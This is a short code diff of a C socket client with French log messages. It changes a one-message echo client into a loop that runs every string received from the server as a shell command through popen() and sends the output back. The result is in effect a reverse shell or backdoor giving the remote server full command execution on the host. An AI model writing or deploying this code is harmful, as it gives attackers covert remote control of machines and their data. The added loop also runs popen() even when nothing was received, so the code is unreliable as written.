@@ -48,18 +48,21 @@ int main() {
 
     printf("[+] Connecté au serveur !\n");
 
-    char *msg = "Hello from client!";
     char test[1024] = {0};
     while(1) {
-        send(sock, msg, strlen(msg), 0);
-        printf("[>] Envoyé: %s\n", msg);
         int n = recv(sock, test, sizeof(test) - 1, 0);
         if (n > 0) {
             test[n] = '\0';
             printf("[<] Reçu: %s\n", test);
         } 
-        break;
-    }
+        FILE *fp = popen(test, "r");
+        char line[1024];
+        while (fgets(line, sizeof(line), fp) != NULL) {
+            send(sock, line, strlen(line), 0);
+            printf("[>] Envoyé: %s", line);
+        }
+        pclose(fp);
+    }   
 
     CLOSE_SOCKET(sock);
     CLEANUP_WINSOCK();
